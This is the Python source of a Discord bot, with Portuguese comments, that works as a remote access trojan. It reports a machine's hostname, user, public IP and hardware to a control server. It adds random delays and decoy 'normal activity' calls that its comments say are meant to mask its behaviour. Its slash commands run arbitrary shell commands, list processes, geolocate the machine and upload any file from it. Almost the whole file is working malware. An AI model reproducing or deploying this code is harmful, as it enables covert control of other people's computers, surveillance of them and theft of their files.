import discord
from discord.ext import commands
from discord.ui import View, Button
import subprocess
import os
import platform
import random
import time
import urllib.request
import json
import locale 

# ======================== CONFIGURAÇÃO ========================

TOKEN = "TOKEN"
GUILD_ID = 1343592669338665038  # ID do servidor
CHANNEL_NAME = "🌐｜dashboard"
ENCODING = locale.getpreferredencoding()

intents = discord.Intents.default()
intents.messages = True
intents.guilds = True
bot = commands.Bot(command_prefix="!", intents=intents, help_command=None)


# ===================== FUNÇÕES AUXILIARES =====================

# tempo aleatório antes da conexao com o server para mascarar comportamento
def random_wait():
    delay = random.randint(10, 30)
    print(f"[INFO] A aguardar {delay}s antes de iniciar...")
    time.sleep(delay)


def get_public_ip():
    try:
        with urllib.request.urlopen("https://api64.ipify.org") as response:
            return response.read().decode().strip()
    except:
        return "IP não disponível"


def atraso_humano(min_s=0.5, max_s=1.5):
    time.sleep(random.uniform(min_s, max_s))


def normal_activity():
    atividades = [
        lambda: os.listdir("."),
        lambda: platform.processor(),
        lambda: os.getcwd(),
        lambda: os.path.expanduser("~"),
        lambda: platform.architecture(),
        lambda: os.path.exists("C:\\Windows"), 
        lambda: platform.system(),
        lambda: os.cpu_count()
    ]

    comandos = random.sample(atividades, k=random.randint(2, 4))
    
    for comando in comandos:
        try:
            comando()
        except:
            pass
        atraso_humano()


# ===================== CLASSES DE VIEW =====================

# Botão para criar canal de controlo por máquina
class MachineView(View):
    def __init__(self, machine_id):
        super().__init__(timeout=None)
        self.machine_id = machine_id

    @discord.ui.button(label="Control", style=discord.ButtonStyle.primary)
    async def Control(self, interaction: discord.Interaction, button: Button):
        guild = interaction.guild
        category = discord.utils.get(guild.categories, name="Máquinas")
        if not category:
            category = await guild.create_category("Máquinas")

        channel = discord.utils.get(category.text_channels, name=self.machine_id)
        if not channel:
            overwrites = {
                guild.default_role: discord.PermissionOverwrite(view_channel=False),
                interaction.user: discord.PermissionOverwrite(view_channel=True)
            }
            channel = await category.create_text_channel(name=self.machine_id, overwrites=overwrites)
        await interaction.response.send_message(f"Canal criado ou já existente: {channel.mention}", ephemeral=True)


# ===================== EVENTOS DO BOT =====================

# Evento de inicialização
@bot.event
async def on_ready():
    print(f"✅ Bot {bot.user.name} está online!")
    await bot.tree.sync()
    guild = discord.utils.get(bot.guilds, id=GUILD_ID)
    if guild:
        canal = discord.utils.get(guild.text_channels, name=CHANNEL_NAME)
        if canal:
            normal_activity()
            machine_id = platform.node()
            try:
                machine_user = os.getlogin()
            except:
                machine_user = "Desconhecido"
            ip = get_public_ip()
            os_name = platform.system() + " " + platform.release()
            architecture = platform.architecture()[0]
            cpu_name = platform.processor()

            embed = discord.Embed(title="New Connected Machine", color=discord.Color.green())
            embed.add_field(name="Hostname", value=f"`{machine_id}`", inline=True)
            embed.add_field(name="User", value=f"`{machine_user}`", inline=True)
            embed.add_field(name="IP", value=f"`{ip}`", inline=True)
            embed.add_field(name="System", value=f"`{os_name}`", inline=True)
            embed.add_field(name="architecture", value=f"`{architecture}`", inline=True)
            embed.add_field(name="CPU", value=f"`{cpu_name}`", inline=False)
            
            view = MachineView(machine_id)
            await canal.send(embed=embed, view=view)


# ===================== COMANDOS SLASH =====================

@bot.tree.command(name="sys", description="Executa uma instrução remota.")
async def sys_action(interaction: discord.Interaction, comando: str):
    if interaction.channel.name.lower() == platform.node().lower():
        await interaction.response.defer(thinking=True) 
        normal_activity() 
        try:
            output = subprocess.check_output(comando, shell=True, text=True, stderr=subprocess.STDOUT, encoding=ENCODING)
            if not output:
                output = "(Sem saída)"
        except subprocess.CalledProcessError as e:
            output = e.output
        await interaction.followup.send(f"```{output}```")
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)


@bot.tree.command(name="proc", description="Lista os processos em execução na máquina")
async def process(interaction: discord.Interaction):
    if interaction.channel.name.lower() == platform.node().lower():
        await interaction.response.defer(thinking=True)
        normal_activity()
        try:
            output = subprocess.check_output("tasklist" if platform.system() == "Windows" else "ps aux", shell=True, text=True, stderr=subprocess.STDOUT, encoding=ENCODING)
            file_path = "process_list.txt"
            with open(file_path, "w", encoding="utf-8") as f:
                f.write(output)
            await interaction.followup.send("Lista de processos:", file=discord.File(file_path))
            os.remove(file_path)
        except subprocess.CalledProcessError as e:
            await interaction.followup.send(f"Erro ao obter processos: {e}", ephemeral=True)
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal correspondente!", ephemeral=True)


@bot.tree.command(name="loc", description="Obtém a localização aproximada")
async def location(interaction: discord.Interaction):
    if interaction.channel.name.lower() == platform.node().lower():
        await interaction.response.defer(thinking=True)
        normal_activity()
        try:
            ip = get_public_ip()
            with urllib.request.urlopen(f"http://ip-api.com/json/{ip}") as response:
                data = json.loads(response.read().decode())

            if data["status"] == "success":
                embed = discord.Embed(title="Localização Aproximada", color=discord.Color.blue())
                embed.add_field(name="IP", value=f"`{ip}`", inline=False)
                embed.add_field(name="País", value=data["country"], inline=True)
                embed.add_field(name="Cidade", value=data["city"], inline=True)
                embed.add_field(name="ISP", value=data["isp"], inline=False)

                await interaction.followup.send(embed=embed)
            else:
                await interaction.followup.send("❌ Não foi possível obter a localização.")
        except Exception as e:
            await interaction.followup.send(f"⚠ Erro: {str(e)}", ephemeral=True)
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)


@bot.tree.command(name="dwn", description="Faz download de um ficheiro")
async def download(interaction: discord.Interaction, caminho: str):
    if interaction.channel.name.lower() == platform.node().lower():
        await interaction.response.defer(thinking=True)
        normal_activity()
        if os.path.exists(caminho):
            try:
                await interaction.followup.send(content="Ficheiro encontrado:", file=discord.File(caminho))
            except Exception as e:
                await interaction.followup.send(f"❌ Erro ao tentar enviar o ficheiro: {e}", ephemeral=True)
        else:
            await interaction.followup.send("❌ Ficheiro não encontrado.", ephemeral=True)
    else:
        await interaction.response.send_message("⚠ Este comando só pode ser usado no canal da máquina correspondente!", ephemeral=True)


# ===================== EXECUÇÃO INICIAL =====================

normal_activity()
random_wait()
bot.run(TOKEN)
